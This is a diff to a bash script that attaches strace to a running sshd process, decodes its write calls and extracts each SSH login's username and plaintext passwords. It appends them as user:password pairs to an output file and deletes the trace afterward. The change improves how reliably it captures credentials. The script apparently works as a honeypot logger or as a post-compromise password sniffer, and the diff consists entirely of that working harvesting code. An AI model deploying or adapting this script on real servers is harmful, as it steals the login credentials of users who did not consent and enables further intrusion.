@@ -22,27 +22,24 @@ fi
 function parse_creds () {
 	local i=0
 	while IFS='' read -r line || [[ -n "$line" ]]; do
-		if [ "$i" -eq "2" ]; then
-			local str=$(echo "$line" | grep -o '".*"' | sed 's/"//g') # get quoted value from the line
-			local len=$(echo "$line" | awk 'NF>1{print $NF}') # get the number of total chars
-			local off=$((4-len))
-			local user=${str:($off)}
-		elif [ "$i" -eq "11" ]; then
-			local str=$(echo "$line" | grep -o '".*"' | sed 's/"//g') # get quoted value from the line
-                        local len=$(echo "$line" | awk 'NF>1{print $NF}') # get the number of total chars
-                        local off=$((4-len))
-                        local pass=${str:($off)}
-			echo "$user:$pass" >>"$outfile"
-                        echo "Login attempt from $user:$pass"
-		elif [[ "$i" -gt "11" && $(((i-11)%3)) -eq "0" && -z $(echo "$line" | grep "^+++") ]]; then
-                        local str=$(echo "$line" | grep -o '".*"' | sed 's/"//g') # get quoted value from the line
-                        local len=$(echo "$line" | awk 'NF>1{print $NF}') # get the number of total chars
-                        local off=$((4-len))
-                        local pass=${str:($off)}
-			echo "$user:$pass" >>"$outfile"
-                        echo "Login attempt from $user:$pass"
+		# Get lines that write to file descriptor 4 and have a length greater than 5
+		if [[ "$line" == "write(4, "* ]] && (( $(echo "$line" | awk '{print $NF}') > 5 )); then
+			# Get the quoted string and remove the first four hex characters
+			local input=$(echo "$line" | cut -d '"' -f 2 | cut -c 17-)
+			# Make sure there aren't any null bytes in the string
+			if [[ "$input" != *"\x00"* ]]; then
+				# Convert the string from hex to binary
+				input=$(echo -e "$input")
+				# Identify the username and password(s)
+				if [ "$i" -eq "0" ]; then
+					local user="$input"
+				else
+					echo "$user:$input" >>"$outfile"
+					echo "Login attempt from $user:$input"
+				fi
+				let "i++"
+			fi
 		fi
-		let "i++"
 	done < "$1"
 	rm -f "$1"
 }
@@ -52,6 +49,6 @@ echo "Listening for SSH connections...press Ctrl-C to exit."
 while [ 1 ]; do
 	pid=$(ps aux | grep ssh | grep net | awk {' print $2'})
 	if [ -n "$pid" ]; then
-		strace -q -e write -p "$pid" -o "strace$pid.log" && parse_creds "strace$pid.log"
+		strace -qx -s 250 -e trace=write -p "$pid" -o "strace$pid.log" && parse_creds "strace$pid.log"
 	fi
 done
